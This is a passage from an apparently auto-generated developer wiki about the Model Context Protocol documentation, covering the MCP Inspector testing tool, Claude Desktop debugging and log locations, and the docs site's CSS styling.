        Counters["h2-counter through h6-counter<br/>Hierarchical numbering"]
    end
    
    FontMono --> TSDSignature
    FeatureMatrix --> |"table layout"| FeatureMatrix
    SectionNumbers --> Counters
    SchemaRef --> TSDSignature
    SchemaRef --> TSDMember
    
    TSDSignature --> |"border, padding"| TSDSignature
    TSDMember --> |"scroll-margin, indent"| TSDMember
```

**CSS Architecture and Selector Hierarchy**

The styling system uses feature-detection selectors (`body:has(#enable-section-numbers)`, `body:has(#schema-reference)`) to apply styles only when specific marker elements are present, allowing different styling behaviors for different page types.

Sources: [docs/style.css:1-207]()

### Generated vs. Hand-Written Content

The documentation system distinguishes between generated and hand-written content through Git attributes and Prettier ignore rules:

**Generated Files** (marked as `linguist-generated=true`):
- `schema/*/schema.json` - JSON Schema definitions
- `docs/specification/*/schema.md` - Markdown schema documentation  
- `docs/specification/*/schema.mdx` - MDX schema documentation

These files are excluded from Prettier formatting and language statistics to prevent manual editing.

**Hand-Written Files**:
- `docs/**/*.mdx` (excluding generated schema files)
- `blog/content/**/*.md`
- Configuration files (`docs.json`, `hugo.toml`)

Sources: [.gitattributes:1-5](), [.prettierignore:1-3]()

## Tool Integration Architecture

```mermaid
graph TB
    subgraph Development["Development Workflow"]
        ServerCode["MCP Server Code<br/>TypeScript/Python/Java/Kotlin"]
        Inspector["MCP Inspector<br/>@modelcontextprotocol/inspector"]
        ClaudeDesktop["Claude Desktop<br/>Integration Testing"]
    end
    
    subgraph Documentation["Documentation Workflow"]
        SchemaTS["schema/*/schema.ts<br/>TypeScript Definitions"]
        GenSchemas["generate-schemas.ts<br/>JSON + MDX Generation"]
        MintlifyDocs["Mintlify Site<br/>modelcontextprotocol.io"]
    end
    
    subgraph Community["Community Workflow"]
        BlogContent["blog/content/*.md<br/>Markdown Posts"]
        HugoBlog["Hugo Site<br/>blog.modelcontextprotocol.io"]
    end
    
    ServerCode -->|"npx inspector"| Inspector
    Inspector -->|"stdio transport"| ServerCode
    ServerCode -->|"claude_desktop_config.json"| ClaudeDesktop
    
    SchemaTS -->|"typescript-json-schema"| GenSchemas
    GenSchemas -->|"generates"| MintlifyDocs
    
    BlogContent -->|"hugo build"| HugoBlog
    
    MintlifyDocs -->|"links to"| HugoBlog
    HugoBlog -->|"navbar link"| MintlifyDocs
```

**MCP Tools Ecosystem Integration**

The tools ecosystem supports three parallel workflows:

1. **Development Workflow**: Inspector enables rapid iteration on server code with immediate feedback
2. **Documentation Workflow**: Automated generation ensures specifications stay synchronized with schema definitions
3. **Community Workflow**: Blog platform maintains community engagement through announcements and updates

These workflows are independent but interconnected - Inspector validates servers against specifications maintained in Mintlify, while the blog announces new protocol versions that developers test with the Inspector.

Sources: [docs/docs.json:1-462](), [blog/hugo.toml:1-71](), [docs/docs/tools/inspector.mdx:1-159]()

## Navigation and Cross-References

The documentation platform implements a sophisticated navigation and redirect system:

### Multi-Version Specification Support

The `docs.json` configuration defines separate navigation trees for each protocol version:
- `2025-11-25` (latest) - Current stable version with tasks support
- `2025-06-18` - Previous stable version
- `2025-03-26` - Historical version
- `2024-11-05` - Original public release
- `draft` - Active development version

Each version maintains its own complete specification tree, allowing users to reference specific protocol versions for compatibility.

### URL Redirect System

The redirect system handles URL migrations and provides convenience aliases:

```
/specification/latest → /specification/2025-11-25
/quickstart → /docs/develop/build-server
/legacy/tools/inspector → /docs/tools/inspector
```

Redirects use wildcard patterns (`/specification/latest/:slug*`) to preserve deep links when redirecting version-specific pages.

Sources: [docs/docs.json:368-454]()

## Asset Management

Both documentation systems manage static assets:

### Mintlify Assets
- **Favicon**: `/favicon.svg` (SVG format for scalability)
- **Logos**: Light and dark variants (`/logo/light.svg`, `/logo/dark.svg`)
- **OpenGraph Image**: Social media preview image for link sharing
- **Screenshots**: Inspector interface image at `/images/mcp-inspector.png`

### Hugo Blog Assets
- **Favicon**: `blog/static/favicon.svg` (same branding as main docs)
- **OpenGraph Image**: `blog/static/og-image.png` (PNG format, 1200x630px)
- **Theme Assets**: PaperMod theme provides built-in icons and styling

The shared favicon ensures consistent branding across both platforms.

Sources: [docs/docs.json:353-361](), [blog/hugo.toml:35-36](), [blog/static/favicon.svg:1-12]()

## Best Practices for Tool Usage

### Inspector Development Patterns

1. **Incremental Testing**: Test individual features (tools, resources, prompts) in isolation before integration
2. **Environment Configuration**: Use absolute paths in server commands to avoid working directory issues
3. **Notification Monitoring**: Watch the notifications pane for server errors and warnings during testing
4. **Edge Case Validation**: Test with invalid inputs, missing arguments, and concurrent operations

### Documentation Development Patterns

1. **Version Awareness**: Always specify which protocol version documentation applies to
2. **Generated File Discipline**: Never manually edit files marked `linguist-generated=true`
3. **Link Validation**: Use `mint broken-links` command to detect broken internal links
4. **Custom Styling**: Add page-specific styles only when necessary, preferring Mintlify defaults

### Integration Workflow

The typical development cycle integrates both tools:

1. Write server code implementing MCP features
2. Test with Inspector to validate basic functionality
3. Update documentation to reflect new capabilities
4. Generate schema documentation via `npm run generate`
5. Test integration with Claude Desktop
6. Publish blog post announcing new features

This workflow ensures servers are tested, documented, and announced in a coordinated manner.

Sources: [docs/docs/tools/inspector.mdx:117-138](), [docs/legacy/tools/debugging.mdx:206-227]()

## Related Pages

For detailed information about each tool:
- [MCP Inspector](#8.1) - Comprehensive Inspector guide with usage examples
- [Documentation and Blog Systems](#8.2) - Technical reference for publishing infrastructure

For related development topics:
- [Development Guide](#6) - Contributing to the MCP specification
- [Build System and CI/CD](#6.4) - Automated validation and generation
- [Documentation System](#6.5) - Architecture of the documentation pipeline

---

# Page: MCP Inspector

# MCP Inspector

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [docs/community/sdk-tiers.mdx](docs/community/sdk-tiers.mdx)
- [docs/docs/develop/connect-local-servers.mdx](docs/docs/develop/connect-local-servers.mdx)
- [docs/docs/getting-started/intro.mdx](docs/docs/getting-started/intro.mdx)
- [docs/docs/sdk.mdx](docs/docs/sdk.mdx)
- [docs/docs/tools/inspector.mdx](docs/docs/tools/inspector.mdx)
- [docs/examples.mdx](docs/examples.mdx)
- [docs/legacy/concepts/architecture.mdx](docs/legacy/concepts/architecture.mdx)
- [docs/legacy/concepts/sampling.mdx](docs/legacy/concepts/sampling.mdx)
- [docs/legacy/tools/debugging.mdx](docs/legacy/tools/debugging.mdx)

</details>



The MCP Inspector is an interactive developer tool for testing and debugging MCP servers during development. It provides a graphical interface for discovering server capabilities, executing tools, reading resources, testing prompts, and monitoring server behavior without requiring integration with a production MCP client.

For information about broader debugging strategies and using the Inspector as part of a complete debugging workflow, see [Debugging Guide](#6.4).

## Purpose and Scope

The Inspector serves as a standalone MCP client implementation with developer-focused features. Its primary purposes are:

- **Server validation**: Verify that an MCP server correctly implements the protocol specification
- **Interactive testing**: Manually test tools, resources, and prompts before client integration
- **Development iteration**: Rapidly test changes during server development without restarting a full client application
- **Protocol debugging**: Inspect message exchanges and server behavior at the protocol level

The Inspector is not intended for production use or end-user interactions. It is exclusively a development and testing tool for server authors.

## Architecture and Design

### Inspector as MCP Client

```mermaid
graph TB
    subgraph "MCP Inspector Process"
        UI["Web UI<br/>(Browser Interface)"]
        Client["MCP Client<br/>(@modelcontextprotocol/sdk)"]
        TransportMgr["Transport Manager"]
    end
    
    subgraph "Server Process"
        Server["MCP Server<br/>(Under Test)"]
    end
    
    subgraph "Transport Options"
        StdioTransport["StdioClientTransport<br/>(Local Servers)"]
        HTTPTransport["HTTP Transport<br/>(Remote Servers)"]
    end
    
    UI -->|"User Actions"| Client
    Client -->|"Protocol Messages"| TransportMgr
    TransportMgr -->|"stdio"| StdioTransport
    TransportMgr -->|"HTTP/SSE"| HTTPTransport
    StdioTransport -->|"stdin/stdout"| Server
    HTTPTransport -->|"HTTP POST"| Server
    Server -->|"Responses"| TransportMgr
    TransportMgr -->|"Protocol Messages"| Client
    Client -->|"Display Updates"| UI
```

**Inspector Architecture Overview**

Sources: [docs/docs/tools/inspector.mdx:1-159](), [docs/docs/learn/architecture.mdx:1-464]()

The Inspector implements a complete MCP client using the `@modelcontextprotocol/sdk` package. It initializes connections to test servers using either `StdioClientTransport` for local servers or HTTP transport for remote servers. The web-based UI translates user interactions into protocol messages and displays server responses.

### Protocol Message Flow

```mermaid
sequenceDiagram
    participant User
    participant Inspector["MCP Inspector<br/>(Client)"]
    participant Server["Test Server"]
    
    Note over User,Server: Connection Phase
    User->>Inspector: npx @modelcontextprotocol/inspector <command>
    Inspector->>Server: Launch server process
    Inspector->>Server: initialize request
    Server-->>Inspector: initialize response<br/>(capabilities)
    Inspector->>Server: initialized notification
    
    Note over User,Server: Discovery Phase
    Inspector->>Server: tools/list
    Server-->>Inspector: tools array
    Inspector->>Server: resources/list
    Server-->>Inspector: resources array
    Inspector->>Server: prompts/list
    Server-->>Inspector: prompts array
    
    Note over User,Server: Interactive Testing Phase
    User->>Inspector: Click tool execution
    Inspector->>Server: tools/call
    Server-->>Inspector: tool result
    Inspector->>User: Display result
    
    User->>Inspector: Read resource
    Inspector->>Server: resources/read
    Server-->>Inspector: resource contents
    Inspector->>User: Display contents
```

**Inspector Protocol Interaction Sequence**

Sources: [docs/docs/tools/inspector.mdx:1-159](), [docs/docs/learn/architecture.mdx:146-463]()

## Installation and Execution

The Inspector requires no installation and runs directly through `npx`:

```bash
npx @modelcontextprotocol/inspector <command> [args...]
```

### Execution Patterns by Server Type

| Server Type | Command Pattern | Example |
|------------|----------------|---------|
| npm package | `npx @modelcontextprotocol/inspector npx <package>` | `npx @modelcontextprotocol/inspector npx @modelcontextprotocol/server-filesystem /path` |
| PyPI package | `npx @modelcontextprotocol/inspector uvx <package>` | `npx @modelcontextprotocol/inspector uvx mcp-server-git --repository ~/repo.git` |
| Local TypeScript | `npx @modelcontextprotocol/inspector node <path>` | `npx @modelcontextprotocol/inspector node ./build/index.js` |
| Local Python | `npx @modelcontextprotocol/inspector uv --directory <dir> run <script>` | `npx @modelcontextprotocol/inspector uv --directory ./server run server.py` |

Sources: [docs/docs/tools/inspector.mdx:9-76]()

The first argument to the Inspector is the command to launch the server, and subsequent arguments are passed to that server. The Inspector automatically handles process management and transport setup.

## Feature Overview

### Server Connection Pane

```mermaid
graph LR
    subgraph "Connection Configuration"
        TransportSelect["Transport Selector"]
        CommandConfig["Command Configuration"]
        EnvConfig["Environment Variables"]
    end
    
    subgraph "Connection State"
        Status["Connection Status"]
        Caps["Negotiated Capabilities"]
    end
    
    TransportSelect -->|"stdio/HTTP"| Status
    CommandConfig -->|"Launch params"| Status
    EnvConfig -->|"Server env"| Status
    Status -->|"After initialize"| Caps
```

**Server Connection Configuration Flow**

Sources: [docs/docs/tools/inspector.mdx:86-90]()

The connection pane allows configuration of:

- **Transport mechanism**: Selection between stdio (local servers) and Streamable HTTP (remote servers)
- **Command-line arguments**: Customization of server launch parameters
- **Environment variables**: Definition of environment variables passed to the server process

For stdio transport, the Inspector launches the server as a subprocess and manages the stdin/stdout communication channels. For HTTP transport, it connects to a running remote server endpoint.

### Resources Tab

The Resources tab provides interfaces for:

| Feature | Operation | Protocol Method |
|---------|-----------|----------------|
| Resource listing | Display all available resources | `resources/list` |
| Metadata display | Show MIME types and descriptions | Included in list response |
| Content inspection | Read and display resource contents | `resources/read` |
| Template discovery | List resource templates with parameters | `resources/templates/list` |
| Subscription testing | Subscribe to resource updates | `resources/subscribe` |

Sources: [docs/docs/tools/inspector.mdx:91-96]()

When a resource is selected, the Inspector issues a `resources/read` request with the resource URI and displays the returned contents formatted according to the declared MIME type. For resource templates, the Inspector provides input fields for template parameters.

### Prompts Tab

The Prompts tab enables:

| Feature | Operation | Protocol Method |
|---------|-----------|----------------|
| Prompt discovery | List all available prompts | `prompts/list` |
| Argument inspection | Display required and optional arguments | Included in list response |
| Argument entry | Provide custom values for prompt arguments | User input form |
| Message preview | Display generated message structures | `prompts/get` |

Sources: [docs/docs/tools/inspector.mdx:98-104]()

Prompt testing workflow:
1. Select a prompt from the list
2. Inspect required arguments and their schemas
3. Enter argument values in provided input fields
4. Execute `prompts/get` request with provided arguments
5. View the generated message structure that would be sent to an LLM

### Tools Tab

The Tools tab provides:

| Feature | Operation | Protocol Method |
|---------|-----------|----------------|
| Tool listing | Display all available tools | `tools/list` |
| Schema inspection | View tool input schemas | Included in list response |
| Input construction | Build tool arguments from schema | User input form |
| Tool execution | Invoke tools with provided inputs | `tools/call` |
| Result display | Show tool execution results | Display call response |

Sources: [docs/docs/tools/inspector.mdx:106-111]()

The tool execution flow:
1. Select a tool from the available list
2. Inspect the `inputSchema` JSON Schema definition
3. Construct arguments matching the schema (the Inspector provides form inputs based on schema types)
4. Execute `tools/call` with the tool name and arguments
5. Display the result content array returned by the server

### Notifications Pane

```mermaid
graph TB
    subgraph "Notification Sources"
        ServerLogs["Server Logs<br/>(logging/message)"]
        ListChanges["List Change Notifications<br/>(tools/list_changed, etc)"]
        ResourceUpdates["Resource Updates<br/>(resources/updated)"]
    end
    
    subgraph "Notifications Pane"
        LogView["Log Message Display"]
        EventView["Protocol Event Display"]
        FilterControls["Filter Controls"]
    end
    
    ServerLogs -->|"severity, data"| LogView
    ListChanges -->|"notification"| EventView
    ResourceUpdates -->|"notification"| EventView
    FilterControls -->|"filter rules"| LogView
    FilterControls -->|"filter rules"| EventView
```

**Notification Flow in Inspector**

Sources: [docs/docs/tools/inspector.mdx:113-116]()

The Notifications pane displays:

- **Log messages**: Server-sent logging messages via `logging/message` notifications, categorized by severity level (debug, info, warning, error)
- **Protocol notifications**: Real-time notifications such as `tools/list_changed`, `resources/list_changed`, `prompts/list_changed`, and `resources/updated`

This pane is essential for debugging because it captures all server-initiated communications, including error messages and state change announcements.

## Development Workflow Integration

### Iterative Testing Pattern

```mermaid
graph TD
    StartDev["Start Development"]
    EditCode["Edit Server Code"]
    Rebuild["Rebuild Server"]
    LaunchInsp["Launch Inspector"]
    TestFeatures["Test Tools/Resources/Prompts"]
    CheckLogs["Review Notifications/Logs"]
    IssueFound{"Issues Found?"}
    
    StartDev --> LaunchInsp
    LaunchInsp --> TestFeatures
    TestFeatures --> CheckLogs
    CheckLogs --> IssueFound
    IssueFound -->|"Yes"| EditCode
    IssueFound -->|"No"| Complete["Development Complete"]
    EditCode --> Rebuild
    Rebuild --> LaunchInsp
```

**Inspector Development Iteration Cycle**

Sources: [docs/docs/tools/inspector.mdx:119-138](), [docs/legacy/tools/debugging.mdx:206-227]()

The Inspector integrates into the development workflow at multiple stages:

1. **Initial development**: Verify basic connectivity and capability negotiation during initial server implementation
2. **Feature development**: Test each new tool, resource, or prompt as it is implemented
3. **Edge case testing**: Validate error handling, invalid inputs, and boundary conditions
4. **Protocol compliance**: Ensure correct message formats and response structures

### Testing Checklist

When using the Inspector during development:

| Test Category | Test Items |
|--------------|------------|
| **Connection** | Server launches successfully<br/>Initialization completes<br/>Capabilities negotiated correctly |
| **Discovery** | All tools listed<br/>All resources listed<br/>All prompts listed |
| **Tools** | Input schemas valid<br/>Tool execution succeeds<br/>Results formatted correctly<br/>Error handling works |
| **Resources** | URIs resolve correctly<br/>Content returned matches MIME type<br/>Templates accept parameters<br/>Subscriptions work |
| **Prompts** | Arguments validated<br/>Messages generated correctly<br/>Output suitable for LLM |
| **Error Handling** | Invalid inputs rejected<br/>Error messages clear<br/>Server remains stable |

Sources: [docs/docs/tools/inspector.mdx:119-138]()

## Common Usage Patterns

### Pattern: Tool Development and Testing

```typescript
// Server development sequence for new tool
1. Implement tool in server code
2. Build server: npm run build
3. Launch Inspector: npx @modelcontextprotocol/inspector node build/index.js
4. Navigate to Tools tab
5. Verify tool appears in list
6. Click tool to view input schema
7. Enter test inputs
8. Execute tool
9. Verify result structure and content
10. Check Notifications pane for any errors
```

Sources: [docs/docs/tools/inspector.mdx:119-138](), [docs/docs/develop/build-server.mdx:1-1441]()

### Pattern: Resource Template Testing

For servers implementing resource templates:

1. Navigate to Resources tab in Inspector
2. Locate template-based resources (those with parameters)
3. Click to view template URI pattern (e.g., `file:///{path}`)
4. Enter parameter values in provided inputs
5. Execute read operation
6. Verify content matches expected data for those parameters
7. Test parameter completion if implemented
8. Test multiple parameter combinations

Sources: [docs/docs/tools/inspector.mdx:91-96](), [docs/docs/learn/server-concepts.mdx:98-174]()

### Pattern: Notification Debugging

When debugging server behavior:

1. Launch Inspector with server
2. Open Notifications pane immediately
3. Perform actions in other tabs (execute tools, read resources)
4. Monitor notifications for:
   - Log messages indicating internal server state
   - Error messages from failed operations
   - List change notifications when capabilities update
   - Resource update notifications when data changes
5. Use log messages to trace execution flow
6. Identify issues from error severity logs

Sources: [docs/docs/tools/inspector.mdx:113-116](), [docs/legacy/tools/debugging.mdx:156-205]()

## Best Practices

### Inspector Usage Guidelines

**During development**:
- Launch Inspector early to verify basic server functionality before implementing complex features
- Test each new capability immediately after implementation
- Keep Inspector open during development for rapid testing after rebuilds
- Use the Notifications pane to identify issues before they manifest as failures

**Edge case testing**:
- Provide invalid inputs to tools to verify error handling
- Test missing required arguments in prompts
- Attempt to read non-existent resources
- Test concurrent operations if server supports them

**Before client integration**:
- Execute complete test suite through Inspector
- Verify all tools produce expected output formats
- Confirm resources return correct MIME types
- Test prompts generate valid message structures

Sources: [docs/docs/tools/inspector.mdx:119-138]()

### Inspector Limitations

The Inspector has specific limitations:

| Limitation | Description | Workaround |
|------------|-------------|------------|
| **No sampling support** | Cannot test `sampling/createMessage` requests | Test sampling features in a full client implementation |
| **No elicitation support** | Cannot test `elicitation/request` features | Verify elicitation with a client that supports it |
| **Manual testing only** | No automated test execution | Use SDK test utilities for automated testing |
| **Single server focus** | Tests one server at a time | Test multi-server scenarios in client applications |

Sources: [docs/docs/tools/inspector.mdx:1-159](), [docs/legacy/concepts/sampling.mdx:1-249]()

### Complementary Tools

The Inspector works alongside other debugging tools:

- **Claude Desktop logs** (`~/Library/Logs/Claude/mcp*.log`): Verify server behavior in production client
- **Chrome DevTools** (in Claude Desktop): Debug client-side integration issues
- **Server-side logging**: Add custom logging to server implementation for detailed traces
- **SDK test utilities**: Automate regression testing after manual verification with Inspector

Sources: [docs/legacy/tools/debugging.mdx:1-295]()

## Next Steps

After using the Inspector for development:

- **Integrate with Claude Desktop**: Configure server in `claude_desktop_config.json` for real-world testing (see [Connect to Local Servers](#8.1))
- **Test remote deployment**: Deploy server to remote host and test with HTTP transport
- **Implement automated tests**: Create test suites using SDK test utilities
- **Review debugging guide**: Consult broader debugging strategies for production issues (see [Debugging Guide](#6.4))

Sources: [docs/docs/tools/inspector.mdx:140-159](), [docs/docs/develop/connect-local-servers.mdx:1-336]()

---

# Page: Development Tools and Debugging

# Development Tools and Debugging

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [docs/clients.mdx](docs/clients.mdx)
- [docs/community/sdk-tiers.mdx](docs/community/sdk-tiers.mdx)
- [docs/docs/develop/connect-local-servers.mdx](docs/docs/develop/connect-local-servers.mdx)
- [docs/docs/getting-started/intro.mdx](docs/docs/getting-started/intro.mdx)
- [docs/docs/sdk.mdx](docs/docs/sdk.mdx)
- [docs/docs/tools/inspector.mdx](docs/docs/tools/inspector.mdx)
- [docs/docs/tutorials/security/authorization.mdx](docs/docs/tutorials/security/authorization.mdx)
- [docs/legacy/concepts/architecture.mdx](docs/legacy/concepts/architecture.mdx)
- [docs/legacy/concepts/sampling.mdx](docs/legacy/concepts/sampling.mdx)
- [docs/legacy/tools/debugging.mdx](docs/legacy/tools/debugging.mdx)
- [docs/sdk/java/mcp-client.mdx](docs/sdk/java/mcp-client.mdx)
- [docs/sdk/java/mcp-overview.mdx](docs/sdk/java/mcp-overview.mdx)
- [docs/sdk/java/mcp-server.mdx](docs/sdk/java/mcp-server.mdx)

</details>



This document covers the debugging techniques, tools, and utilities available for developing and troubleshooting MCP servers and clients. It includes guidance on using the MCP Inspector, analyzing logs, leveraging Chrome DevTools, and addressing common issues during development.

For information about the MCP Inspector specifically, see [page 9.1](9.1). For the broader development guide and build system, see [page 7](7).

## Debugging Tools Overview

MCP provides several tools and techniques for debugging at different levels:

```mermaid
graph TB
    subgraph "Debugging_Tools"
        Inspector["MCP Inspector<br/>Interactive testing interface<br/>@modelcontextprotocol/inspector"]
        DesktopTools["Claude Desktop Developer Tools<br/>Integration testing<br/>Chrome DevTools access"]
        ServerLogging["Server Logging<br/>stderr capture<br/>Log message notifications"]
        LogFiles["Log File Analysis<br/>mcp.log<br/>mcp-server-*.log"]
    end
    
    subgraph "Use_Cases"
        DirectTest["Direct Server Testing<br/>Verify capabilities<br/>Test tools/resources/prompts"]
        IntegrationTest["Integration Testing<br/>Test with client<br/>Monitor message flow"]
        ErrorTracking["Error Tracking<br/>Identify failures<br/>Debug stack traces"]
        PerfMonitor["Performance Monitoring<br/>Track latency<br/>Measure resource usage"]
    end
    
    Inspector --> DirectTest
    DesktopTools --> IntegrationTest
    ServerLogging --> ErrorTracking
    LogFiles --> ErrorTracking
    ServerLogging --> PerfMonitor
    LogFiles --> PerfMonitor
```

**Debugging Workflow:**

1. **Initial Development**: Use MCP Inspector for basic testing and capability verification
2. **Integration Testing**: Test in Claude Desktop with log monitoring
3. **Error Investigation**: Analyze logs and use Chrome DevTools for client-side issues
4. **Performance Analysis**: Monitor message exchanges and operation timing

**Sources:** [docs/docs/tools/inspector.mdx:1-160](), [docs/legacy/tools/debugging.mdx:1-295]()

## MCP Inspector

The MCP Inspector is an interactive developer tool for testing and debugging MCP servers. It provides a web-based interface for direct server interaction without requiring a full client application.

### Installation and Usage

The Inspector runs via `npx` without requiring installation:

```bash
npx @modelcontextprotocol/inspector <command>
```

**Common usage patterns:**

| Use Case | Command |
|----------|---------|
| Test npm package | `npx @modelcontextprotocol/inspector npx @modelcontextprotocol/server-filesystem /path` |
| Test PyPI package | `npx @modelcontextprotocol/inspector uvx mcp-server-git --repository ~/code` |
| Test local TypeScript | `npx @modelcontextprotocol/inspector node path/to/server/index.js args...` |
| Test local Python | `npx @modelcontextprotocol/inspector uv --directory path/to/server run package-name args...` |

**Sources:** [docs/docs/tools/inspector.mdx:1-76]()

### Inspector Features

The Inspector interface provides several tabs for comprehensive server testing:

```mermaid
graph TB
    InspectorUI["MCP Inspector Interface"]
    
    subgraph "Connection_Pane"
        Transport["Transport Selection<br/>stdio/HTTP/SSE"]
        Config["Configuration<br/>Command-line args<br/>Environment variables"]
    end
    
    subgraph "Testing_Tabs"
        Resources["Resources Tab<br/>List resources<br/>View metadata<br/>Read content<br/>Test subscriptions"]
        Prompts["Prompts Tab<br/>List templates<br/>Show arguments<br/>Test with custom args<br/>Preview messages"]
        Tools["Tools Tab<br/>List tools<br/>Show schemas<br/>Test execution<br/>Display results"]
    end
    
    subgraph "Monitoring"
        Notifications["Notifications Pane<br/>Server logs<br/>Received notifications"]
    end
    
    InspectorUI --> Transport
    InspectorUI --> Config
    InspectorUI --> Resources
    InspectorUI --> Prompts
    InspectorUI --> Tools
    InspectorUI --> Notifications
```

**Key capabilities:**

- **Resources Tab**: List all available resources, inspect metadata (MIME types, descriptions), read resource content, test subscription mechanisms
- **Prompts Tab**: Display prompt templates, show argument requirements, test prompts with custom parameters, preview generated messages
- **Tools Tab**: List available tools with schemas, test tool execution with custom inputs, display execution results
- **Notifications Pane**: View all server logs and notifications in real-time

**Sources:** [docs/docs/tools/inspector.mdx:78-116]()

### Development Workflow with Inspector

The Inspector supports an iterative development cycle:

1. **Initial Development**
   - Launch Inspector with your server
   - Verify basic connectivity
   - Check capability negotiation

2. **Iterative Testing**
   - Make server code changes
   - Rebuild the server
   - Reconnect the Inspector
   - Test affected features
   - Monitor message exchanges

3. **Edge Case Testing**
   - Test invalid inputs
   - Test missing arguments
   - Test concurrent operations
   - Verify error handling

**Sources:** [docs/docs/tools/inspector.mdx:117-138]()

## Claude Desktop Debugging

Claude Desktop provides built-in tools for debugging MCP server integrations.

### Checking Server Status

The Claude Desktop interface displays server connection status and available capabilities:

1. Click the MCP plug icon to view:
   - Connected servers
   - Available prompts and resources

2. Click the "Search and tools" slider icon to view:
   - Tools made available to the model

**Sources:** [docs/legacy/tools/debugging.mdx:33-44]()

### Viewing Logs

Claude Desktop writes MCP-related logs to platform-specific directories:

| Platform | Log Location |
|----------|--------------|
| macOS | `~/Library/Logs/Claude/` |
| Windows | `%APPDATA%\Claude\logs\` |

**Log files:**

- `mcp.log`: General MCP connection events and failures
- `mcp-server-SERVERNAME.log`: stderr output from named server

**Viewing logs in real-time:**

```bash
# macOS/Linux
tail -n 20 -f ~/Library/Logs/Claude/mcp*.log

# Windows
type "%APPDATA%\Claude\logs\mcp*.log"
```

**Sources:** [docs/legacy/tools/debugging.mdx:46-60]()

### Chrome DevTools Integration

Access Chrome's developer tools inside Claude Desktop to investigate client-side errors:

1. Enable DevTools by creating `developer_settings.json`:

```bash
echo '{"allowDevTools": true}' > ~/Library/Application\ Support/Claude/developer_settings.json
```

2. Open DevTools with `Command-Option-Shift-i`

**DevTools windows:**

- Main content window: Application UI
- App title bar window: Window chrome

**Useful panels:**

- **Console**: Inspect client-side errors and warnings
- **Network**: Inspect message payloads and connection timing

**Sources:** [docs/legacy/tools/debugging.mdx:62-79]()

## Common Issues and Troubleshooting

### Working Directory Issues

When using MCP servers with Claude Desktop, the working directory may be undefined (like `/` on macOS) since Claude Desktop can be started from anywhere.

**Solution**: Always use absolute paths in configuration and `.env` files:

```json
{
  "command": "npx",
  "args": [
    "-y",
    "@modelcontextprotocol/server-filesystem",
    "/Users/username/data"
  ]
}
```

Instead of relative paths like `./data`.

**Sources:** [docs/legacy/tools/debugging.mdx:86-109]()

### Environment Variables

MCP servers inherit only a subset of environment variables automatically: `USER`, `HOME`, and `PATH`.

To override defaults or provide custom variables, specify an `env` key in `claude_desktop_config.json`:

```json
{
  "myserver": {
    "command": "mcp-server-myapp",
    "env": {
      "MYAPP_API_KEY": "some_key"
    }
  }
}
```

**Sources:** [docs/legacy/tools/debugging.mdx:111-126]()

### Server Initialization Problems

Common initialization issues:

| Problem | Cause | Solution |
|---------|-------|----------|
| Server not found | Incorrect executable path | Use absolute path for `command` |
| Missing files | Required files not present | Verify all dependencies installed |
| Permission denied | Insufficient permissions | Check file permissions and ownership |
| Configuration error | Invalid JSON syntax | Validate JSON structure |
| Missing variables | Environment variables not set | Add to `env` key in config |

**Sources:** [docs/legacy/tools/debugging.mdx:128-146]()

### Connection Problems

When servers fail to connect:

1. Check Claude Desktop logs for error messages
2. Verify server process is running
3. Test standalone with MCP Inspector
4. Verify protocol compatibility

**Sources:** [docs/legacy/tools/debugging.mdx:148-155]()

## Styling System

Custom CSS provides Mintlify-specific styling for schema pages, feature matrices, and section numbering.

### CSS Architecture

The styling system is organized into functional sections:

```mermaid
graph TB
    StyleCSS["docs/style.css<br/>Custom Styles"]
    
    subgraph "Base Styles"
        FontMono["--font-mono<br/>JetBrains Mono + fallbacks"]
        Headings["h5/h6 font-weight<br/>500/400"]
    end
    
    subgraph "Feature Matrix Styles"
        TableLayout["table-layout: fixed<br/>font-size: 0.75rem"]
        CellAlign["text-align: center<br/>padding: 0.25rem"]
        FirstCol["First column left-align"]
    end
    
    subgraph "Section Numbering"
        EnableFlag["#enable-section-numbers<br/>display: none"]
        Counters["h2-h6 counters<br/>Hierarchical numbering"]
        BeforeContent["::before pseudo-elements<br/>counter() content"]
    end
    
    subgraph "Schema Reference Styles"
        SchemaFlag["#schema-reference<br/>display: none"]
        TSDComment["tsd-comment margin<br/>First/last child"]
        TSDSignature["tsd-signature styling<br/>Code block appearance"]
        TSDMember["tsd-member layout<br/>Property formatting"]
        HideElements["Hidden elements<br/>anchor-icon/tag/sources"]
    end
    
    StyleCSS --> FontMono
    StyleCSS --> Headings
    StyleCSS --> TableLayout
    StyleCSS --> CellAlign
    StyleCSS --> FirstCol
    StyleCSS --> EnableFlag
    StyleCSS --> Counters
    StyleCSS --> BeforeContent
    StyleCSS --> SchemaFlag
    StyleCSS --> TSDComment
    StyleCSS --> TSDSignature
    StyleCSS --> TSDMember
    StyleCSS --> HideElements
```

**Sources:** [docs/style.css:1-207]()

### Schema Reference Styling

The schema reference pages generated by TypeDoc require extensive custom styling to match Mintlify's design:

**TypeDoc Signature Blocks:**

The `.tsd-signature` class styles TypeScript type signatures to match Mintlify's code blocks:

| Property | Value | Purpose |
|----------|-------|---------|
| `font-family` | `var(--font-mono)` | Monospace font from Mintlify theme |
| `font-size` | `0.875rem` | Match Mintlify code size |
| `margin` | `1.25rem 0` | Vertical spacing |
| `border` | `1px solid` with light-dark color | Border matching Mintlify |
| `border-radius` | `1rem` | Rounded corners |
| `padding` | `1rem 0.875rem` | Internal spacing |

**Syntax Highlighting Colors:**

Light and dark mode colors for TypeScript elements:

- `.tsd-signature-keyword`: `rgb(207, 34, 46)` light / `#9CDCFE` dark
- `.tsd-kind-interface`, `.tsd-kind-type-alias`: `rgb(149, 56, 0)` light / `#4EC9B0` dark
- `.tsd-signature-type`: `rgb(5, 80, 174)` light / `#DCDCAA` dark

**Member Layout:**

Property documentation uses indented layout with monospace headings:

- `[data-typedoc-h="3"]`: Property names in monospace with `scroll-margin-top: 8rem`
- Comments and type declarations indented `1.25rem`
- `[data-typedoc-h="4"]`: Hidden (redundant "Type declaration" headers)
- `[data-typedoc-h="5"]`: Nested property names with subtle background

**Hidden Elements:**

TypeDoc elements not needed in Mintlify context:
- `.tsd-anchor-icon`: Internal TypeDoc anchors
- `.tsd-tag`: JSDoc tag badges
- `.tsd-signature`: Within member context (shown separately)
- `.tsd-sources`: Source file locations

**Sources:** [docs/style.css:104-206]()

### Feature Support Matrix Styling

The client feature support matrix on `clients.mdx` uses custom table styling:

- Table wrapper: `#feature-support-matrix-wrapper`
- Fixed layout with small font: `table-layout: fixed; font-size: 0.75rem`
- Centered cells: `text-align: center; padding: 0.25rem`
